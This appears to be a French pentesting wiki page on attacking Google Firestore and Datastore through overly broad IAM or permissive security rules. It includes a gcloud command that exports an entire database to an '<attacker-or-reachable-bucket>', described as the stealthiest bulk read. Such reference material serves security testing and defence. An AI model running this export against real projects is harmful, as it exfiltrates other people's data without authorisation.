---
title: "Firestore : lire des collections via un IAM trop large et des failles de règles de sécurité"
order: 6
description: "Attaquer Firestore et Datastore : lire et écrire des collections via un IAM de base de données trop large ou des failles de règles de sécurité."
keywords:
  - Firestore
  - Datastore
  - collection
  - database IAM
  - security rules
  - NoSQL
---

# Firestore

Firestore (et son mode Datastore) est une base de données NoSQL serverless accessible via IAM pour l'accès côté serveur et via des **règles de sécurité** pour l'accès par le SDK client. Un principal disposant de `datastore.entities.get`/`list` lit directement les collections, et des règles de sécurité permissives (une règle qui autorise la lecture là où elle ne le devrait pas) exposent les mêmes données à un client non authentifié.

## Lecture côté serveur avec IAM

```bash
gcloud firestore databases list
gcloud firestore export gs://<attacker-or-reachable-bucket>   # bulk dump with datastore.databases.export
```

## Lecture côté client via des règles faibles

```
// a rule like this exposes the collection to any client
match /users/{doc} { allow read: if true; }
```

## Notes d'exploitation

- `datastore.databases.export` vers un bucket que vous contrôlez vide l'intégralité de la base de données hors ligne, la lecture en masse la plus discrète.
- Firestore en mode Native est piloté depuis les SDK d'application ; une config web Firebase fuitée associée à une règle trop large constitue une lecture directe non authentifiée, indépendante de Cloud IAM.

## Outils

- **gcloud** (`firestore export`, `firestore databases list`).
- **Firebase SDK / REST** : lectures par le chemin client contre des règles faibles.

## Références

- [HackTricks Cloud: GCP Firestore](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: Firestore security rules](https://firebase.google.com/docs/firestore/security/get-started)
